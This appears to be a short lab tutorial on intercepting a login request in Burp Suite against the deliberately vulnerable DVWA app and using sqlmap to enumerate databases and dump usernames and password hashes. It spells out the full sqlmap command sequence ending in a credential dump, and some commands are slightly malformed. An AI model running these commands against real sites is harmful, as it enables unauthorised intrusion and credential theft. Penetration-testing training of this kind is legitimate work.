# Bypassing the login page using Burpsuite and Sqlmap

## first download the sqlmap through git clone

```sh
"https://github.com/sqlmapproject/sqlmap.git" sqlmap-dev
 
 ```
Type the following sqlmap –help command in a new terminal. 
 * will list all the flags used to retrieve the information.

## Open BurpSuite which is pre-installed in your kali linux.
 * go to 'proxy' tab  and open the  sub-tab 'intercept'.
 * And make the intercept button to 'on'. 

 ## Step(1.1)
 * Open the firefox browser  to configure the settings.
 * Try to install foxyproxy add-on on the firefox.
 * open the application and modify the proxy settings
 * Change the network setting fields to 127.0.0.1 and port to 8080.
 
 ## Step(1.2)
 * Now we need to install the burp certificate.
 * burp generates TLS certificate for each host,signed by its own Certificate Authority(CA)   certificate.will need Burps ceritficate as a trusted root in your browser.
 * Under the Proxy and <mark>Options tab</mark> for Burp Suite, I’m using the same exact settings. Now that both the <strong>FireFox</strong> and <strong>BurpSuite</strong> proxy settings are configured, FireFox should use Burp Suite as a proxy. 
 * Since Burp Suite is acting as a proxy, FireFox will not be able to request any information from the Web server until we forward it in Burp Suite.
 ## Step(1.3)
  * Using Damn vunlnerable web application(DVWA) we can check for the critical information.
  * Set the security level to <mark>LOW</mark>
  * And goto the sqlInjection tab to testing the site
  * Now try to enter any value in the user field and password field.
  * The burpsuite will intercept the request and give you the header fields of the data.
  * Save the data to local directory with <mark>.txt</mark> format.
 ## Step(1.4)
  * Open sqlmap tool and try to type the command:
  this command will fetch all the databases present.
  ```sh
  sqlmap -r 'path of the file' --dbs

  ``` 
  * Now we know the database present we need to know the tables.
  ```sh
  sqlmap -r 'path of the file' -D 'database name' --tables
  ```
  * to reveal the user tables we need the command:
  ```sh
  sqlmap -r 'path of the file' -D 'database name' -T 'users' –columns
  ```
  * Finally Dump Usernames and Passwords with:
  ```sh
  sqlmap -r 'path of the file' -D 'database name' -T 'table-name' –C 'user,password' –dump
  
  ```
  <strong>Sqlmap quickly retrieves the table entries for the user and password columns in the users table inside the database. We get the usernames and the MD5 hashes of the passwords.</strong>
  
  

  

